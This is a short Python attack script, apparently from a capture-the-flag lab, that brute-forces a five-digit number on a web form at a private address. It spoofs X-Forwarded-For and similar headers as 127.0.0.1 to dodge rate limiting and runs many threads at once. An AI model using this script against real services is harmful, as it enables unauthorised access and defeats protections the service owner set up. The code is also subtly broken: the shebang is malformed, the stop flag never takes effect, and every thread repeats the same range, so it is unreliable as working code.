#/usr/bin/env python3 


import requests
import time
import threading


testVar = True
url = "http://10.10.19.26:8085"
headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Host": "127.0.0.1"
        }


session = requests.session()

def bruteForce():
    for i in range(10000,99999):
        data = {'number': i}
    
        r = session.post(url, data=data, headers=headers)
        response = str(r.text)
    
        rateLimit = "error"
        findStr = "Oh no!"

        if findStr in response:
            print(f'Trying number: {i}')
        elif rateLimit in response:
            print("rate limit hit")
        else:
            print(f'Found the lucky key {i}', r.text)
            testVar = False
            break

semaphore = threading.Semaphore(100)


threads = []
while testVar == True:
    semaphore.acquire()
    thread = threading.Thread(target=bruteForce)
    thread.start()
    threads.append(thread)
for thread in threads:
    thread.join()